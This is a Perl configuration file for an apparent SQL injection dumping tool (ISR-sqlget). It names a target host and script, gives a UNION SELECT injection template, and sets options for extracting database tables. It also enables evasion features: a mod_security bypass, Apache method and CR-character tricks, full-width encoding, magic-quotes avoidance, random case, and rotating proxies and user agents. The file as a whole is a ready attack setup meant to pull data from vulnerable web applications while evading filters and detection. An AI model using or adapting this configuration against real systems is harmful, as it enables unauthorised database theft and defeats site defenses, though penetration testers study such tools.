#!/usr/bin/perl
package conf;

#The parameter @conf::path specifies the way that raw html is parsed to work with the tool.
#It uses embedded perl code with HTML::TreeBuilder to parse the raw html
#The first configuration is a tree array with the html tags names needed.
#The last html tag name is processed with the perl code.
				    
@conf::path = ({
	     'name'  =>{'VAL'=> 'table'},
             'pos'        =>{'VAL'=> '1'},
             'last'        =>{'VAL'=> ''}	     
	    },
	    {
	     'name'  =>{'VAL'=> 'tr'},
             'pos'        =>{'VAL'=> ''},
             'last'        =>{'VAL'=> ''}	     
	    },
	    {
	     'name'  =>{'VAL'=> 'td'},
             'pos'        =>{'VAL'=> ''},
             'last'        =>{'VAL'=> '1'},
	     'action'	  =>{'VAL'=> 
	     '
	     my $auto_a=$items[0]->{\'_content\'}[0];
	     @auto_data=split(/\[__\]/,$auto_a);
	     push(@rows,[@auto_data]);
	     '
	     },
	    },
	    );

$conf::site="http://target.infobyte.com.ar/"; #Site where the vulnerable app is
$conf::script="example3.php";  	      	      #Script file vulnerable
$conf::method="GET";  			      #Method 'POST', 'GET', 'HELLO', '\r\n\r\n\r\n\r\n\r\n' (apache method bypass)
					
$conf::inj = "id=11 union select <VALUE> from <TABLE> <WHERE> <TAIL> --"; #Method parameters with the UNION senteces
#It uses variables that later will be replace with the dynamic information.
#
#    Variables:
#    <VALUE> = Column used to get all the information.
#    <TABLE> = Tables section.
#    <WHERE> = Where section.
#    <TAIL>  = The last part of the sql sentence.
#		    
#    Example: "id=1') union select <VALUE>,'a' from <TABLE> <WHERE> <TAIL> --";

$conf::where=""; #If you need to add some exception in the union table you have to use this
                 #parameter because there are some database structure queries that have "WHERE" included
$conf::tail="";  #The last part of the sql sentence.
$conf::param=0;   #Parameter style = Post style 1, Url style 0
#    Post style=
#    ;root@isr-slackware:~/dev# telnet localhost 80
#    ;Trying 127.0.0.1...
#    ;Connected to localhost.
#    ;Escape character is '^]'.
#    ;GET http://site/aaa.php HTTP/1.0
#    ;id=aaa
#			    
#    Url style:
#    ;root@isr-slackware:~/dev# telnet localhost 80
#    ;Trying 127.0.0.1...
#    ;Connected to localhost.
#    ;Escape character is '^]'.
#    ;GET http://site/aaa.php?id=aaa HTTP/1.0
						    
$conf::dbtype=4; #Database backend = (postgres)
#    1 - Oracle
#    2 - Microsoft SQL Server
#    3 - Mysql
#    4 - Postgres
#    5 - IBM DB2
#    6 - Interbase/Yaffil/Firebird (Borland)
#    7 - Mimer (www.mimer.com)
#    8 - Virtuoso (virtuoso.openlinksw.com)
#    9 - Pervasive (www.pervasive.com)
#    10 - Hsqldb (www.hsqldb.org)
#    11 - SQLite
#    12 - IBM Informix
#    13 - Sybase
#    14 - H2 (http://www.h2database.com)
#    15 - Mckoi (http://mckoi.com/database/)
#    16 - Ingres (http://www.ingres.com)
#    17 - MonetDB (http://www.monetdb.nl)
#    18 - MaxDB (www.mysql.com/products/maxdb/)
#    19 - ThinkSQL (http://www.thinksql.co.uk/)
#    20 - SQLBase (http://www.unify.com)
										
$conf::session="example3";  #Session name (You have to use the same name of the session config file without .pm extension)
$conf::outputdb="./datos/";  #The path of the dumped tables rows

######### proxy
#$conf::proxy_host='http://user:pass@host:port/'; #Proxy support example: 'http://user:pass@host:port/';
$conf::rproxy=0;   				  #Random proxy 1 enable or 0 disable
$conf::rproxyfile="./proxys.txt";  		  #Proxy random file (Use the same format than $conf::proxy_host)

######### filters
$conf::space=0; #Proxy random file (Use the same format than $conf::proxy_host)
		#2 replace space ' ' with comment '/**/'


#$conf::apache_espace    #You can specify the CRs value in the HTTP/s request

#Example:
# Valid apache CRs (\x0b, \x0c, \x0d,)
# $conf::apache_espace="\x0b,\x0c";  #init=\x0b and end=\x0c
# Process GET/POST/XXX HTTP request as "GET\x0b/script.php\x0cHTTP/1.0"

#$conf::apache_espace_rnd=1;     #random combination of CRs 0x0b, 0x0c, 0x0d
#$conf::apache_espace_rmaxn=10;  #Max random number of characters
#In this example, we randomize the CRs (0x0b, 0x0c, 0x0d) from 1 to 10:
#Reference: http://www.osvdb.org/25837


		
$conf::mod_security=0;  #1 enable bypass modsecurity <= 2.1.0 & (=>PHP 5.2.0||PERL||Python)
#Reference: http://www.php-security.org/MOPB/BONUS-12-2007.html
$conf::full_width=0; #1 enable bypass full-width encoding
$conf::ruseragent=0; #1 enable use random user agent
$conf::ruseragentfile="./useragents.txt"; #User agent file list
$conf::uagent="ISR-sqlget"; 	 #Default user agent
$conf::delay=0; 		 #Delay between connections
$conf::rdelay=0; 		 #1 enable random maximum delay between connections, use the $conf:delay as max value.
$conf::magicquotes=0;		 #1 enable avoid magicquotes (use CHR function o simil in each database)
$conf::convertall_hex=0;         #1 enable avoid magicquotes (use CHR function o simil in each database)
$conf::rnd_uppercase=0;		 #1 enable uppercase random transform.

######## filters only mssql
$conf::scape_plas=1;               #1 enable, Use CONCAT function in case of the script can't receive '+'
                                #(used as string concatenation)
$conf::convertall_str=1;           #1 enable convert all columns to string (recommed)
$conf::scape_output_less=0;        #1 enable In case the script can't send '|' use database function to be replaced

######## filters only oracle/db2/virtuoso/h2/mckoi/ingres/monetdb/maxdb/thinksql
$conf::scape_pipe=0; #Use CONCAT function or simil in case the script can't receive '|' (used as string concatenation)

###### deny hash retrieve
#$conf::deny_dbname #array that have the database name not to be processed (blacklist)
#Example value 				 
#$conf::deny_dbname = {'WMSYS' => 1,
#		      'SYS' => 1
#                      };

#Cookie
$conf::cookie=0;  #1 enable cookie arraying
@conf::cookies = ( { #array with the cookies to use
                    version=>undef,
                    key=>'',
                    val=>'',
                    path=>'',
                    domain=>'',
                    port=>undef,
                    path_spec=>undef,
                    secure=>undef,
                    maxage=>undef,
                    discard=>undef,
                    rest=>undef
                    });

#Graphic options (More see GraphViz perl module help)
$conf::graphdir = './graph/'; #The destination directory of graphics files
$conf::glayout = 'dot';
$conf::grootcolor='crimson';
$conf::gdbcolor='darkgreen';
$conf::gtablecolor='olivedrab1';
$conf::gcolumncolor='lightblue2';
$conf::gcolumn=0; #0= don't graph column 1= graph column

1;
__END__